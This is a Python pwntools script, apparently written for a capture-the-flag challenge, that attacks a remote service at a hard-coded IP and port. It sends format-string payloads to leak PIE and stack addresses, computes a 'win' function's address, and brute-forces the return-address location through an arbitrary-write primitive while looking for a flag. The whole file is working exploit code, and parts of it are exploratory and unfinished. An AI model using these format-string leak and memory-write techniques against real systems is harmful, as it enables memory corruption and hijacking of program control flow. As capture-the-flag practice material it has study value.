#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

HOST = '52.59.124.14'
PORT = 5030

WIN_OFFSET = 0xdbed0
GREETING_OFFSET = 0xdc060

def exploit_fmtstr():
    """
    Use format string %n to overwrite the return address with win.

    Key findings:
    - Position 10 contains our input (first 8 bytes)
    - Position 79 contains return address VALUE
    - Positions 77, 78 contain stack addresses

    Strategy:
    We need to find where the return address is stored (LOC_79).
    If position 78 value is near LOC_79, we can calculate it.

    Alternatively, we can use a stack address that's already on the stack
    and use %n to write through it if it happens to point to return address.
    """
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Leak all we need in one go
    # Position 8 = greeting (PIE leak)
    # Position 77 = stack address
    # Position 78 = stack address
    # Position 79 = return address value
    payload = b'%8$p|%77$p|%78$p|%79$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    leak = io.recvline(timeout=5).decode().strip()
    print(f'Leaks: {leak}')

    parts = leak.split('|')
    greeting = int(parts[0], 16)
    stack77 = int(parts[1], 16) if parts[1] != '(nil)' else 0
    stack78 = int(parts[2], 16) if parts[2] != '(nil)' else 0
    ret_val = int(parts[3], 16) if parts[3] != '(nil)' else 0

    pie_base = greeting - GREETING_OFFSET
    win = pie_base + WIN_OFFSET
    expected_ret = pie_base + 0xdc052

    print(f'PIE base: {hex(pie_base)}')
    print(f'Win: {hex(win)}')
    print(f'Return addr: {hex(expected_ret)}')
    print(f'Actual pos79: {hex(ret_val)}')
    print(f'Stack77: {hex(stack77)}')
    print(f'Stack78: {hex(stack78)}')

    if ret_val != expected_ret:
        print('Position 79 is not the return address in this run!')
        io.close()
        return False

    # The difference between win and ret
    diff = win - expected_ret
    print(f'Diff (win - ret): {hex(diff)} = {diff}')
    # win = ret + diff, so we need to add diff to ret, or write win directly

    # The low 2 bytes of win and ret:
    win_low16 = win & 0xffff
    ret_low16 = expected_ret & 0xffff
    print(f'Win low16: {hex(win_low16)}')
    print(f'Ret low16: {hex(ret_low16)}')

    # If we can use %hn to write win_low16 to ret_addr_location,
    # and the upper bytes of win and ret are the same, we win!
    if (win >> 16) == (expected_ret >> 16):
        print('Upper bytes match! Only need to overwrite low 16 bits!')

    io.close()
    return True

def try_write_via_stack_ptr():
    """
    If position 77 or 78 points to something useful,
    we might be able to write through it.

    Let's check if position 77 value + some offset = location of position 79.
    """
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Can we write through position 77 directly?
    # If stack77 points to the return address location, %77$n would work!
    # But that's unlikely...

    # Actually, let's use our input at position 10.
    # We need to:
    # 1. Put ret_addr_location at position 10
    # 2. Use %10$hn to write win_low16

    # The challenge is: we don't know ret_addr_location!
    # But we know stack77 and stack78 values.
    # If the stack layout is predictable, ret_addr_location = stack78 + X

    # Let's calculate: position 79 is 1 slot after position 78
    # So LOC_79 = LOC_78 + 8
    # And LOC_78 is where position 78's value is stored on the stack
    # This is not the same as stack78's value!

    # Hmm, let me think again...
    # When printf reads %78$p, it reads from RSP + 78*8 (approximately)
    # The VALUE at that location is stack78 (0x7ffd...)
    # We want the ADDRESS RSP + 78*8, not the value.

    # But we can calculate! If we know where OUR input is on the stack,
    # we know RSP. Our input is at position 10, so:
    # RSP + 10*8 = &our_input

    # If we can leak &our_input somehow...
    # Position 20 sometimes has a stack address.

    payload = b'%17$p|%18$p|%19$p|%20$p|%21$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    leak = io.recvline(timeout=5).decode().strip()
    print(f'Positions 17-21: {leak}')

    io.close()

def calc_ret_location():
    """
    Calculate the return address location on the stack.

    We know:
    - Position 10 contains our input
    - Position 79 contains return address value

    So: LOC_79 = LOC_10 + (79-10)*8 = LOC_10 + 552

    If we can find LOC_10 (where our input is stored), we can calculate LOC_79.

    One way: if there's a stack address on the stack that equals LOC_X for some X,
    we can calculate from there.
    """
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Let's see if any position contains a pointer to the format string region
    # First, let me check position 6 (often contains RBP)
    payload = b'%6$p|%7$p|%8$p|%77$p|%78$p|%79$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    leak = io.recvline(timeout=5).decode().strip()
    print(f'Leak: {leak}')

    parts = leak.split('|')
    for i, p in enumerate([6, 7, 8, 77, 78, 79]):
        val = parts[i]
        print(f'  Position {p}: {val}')

    io.close()

def brute_ret_offset():
    """
    Use the write-what-where to brute force find the return address location.

    We write 0x00 to stack78 + offset and see what crashes/wins.
    """
    for offset in range(-0x100, 0x200, 8):
        try:
            io = remote(HOST, PORT, timeout=5)
            io.recvuntil(b'Name:\n', timeout=3)

            # Leak
            io.sendline(b'%8$p|%78$p')
            io.recvuntil(b"market:\n", timeout=3)
            leak = io.recvline(timeout=3).decode().strip()

            parts = leak.split('|')
            greeting = int(parts[0], 16)
            stack78 = int(parts[1], 16) if parts[1] != '(nil)' else 0

            if not stack78:
                io.close()
                continue

            pie_base = greeting - GREETING_OFFSET
            win = pie_base + WIN_OFFSET

            target = stack78 + offset

            io.recvuntil(b'slot index 0..128):\n', timeout=3)
            io.sendline(b'19')  # slot 19
            io.recvuntil(b'column offset 0..15):\n', timeout=3)
            io.sendline(b'8')   # column 8 -> fake_stack + 0x1f8
            io.recvuntil(b'how many bytes to update (0..8):\n', timeout=3)
            io.sendline(b'8')
            io.recvuntil(b'Ink (raw bytes):\n', timeout=3)
            io.send(p64(target))

            output = io.recvall(timeout=2)

            if b'ENO{' in output or b'flag' in output.lower():
                print(f'FLAG at offset {hex(offset)}!')
                print(output.decode(errors='replace'))
                return True
            elif len(output) < 50:
                print(f'Offset {hex(offset)}: crash ({len(output)}B)')
            else:
                # Check if output looks different
                pass

            io.close()
        except Exception as e:
            print(f'Offset {hex(offset)}: error {e}')

    return False

if __name__ == '__main__':
    print("=== Analyze format string exploit ===")
    exploit_fmtstr()

    print("\n=== Calculate return location ===")
    calc_ret_location()

    print("\n=== Brute force return offset ===")
    brute_ret_offset()
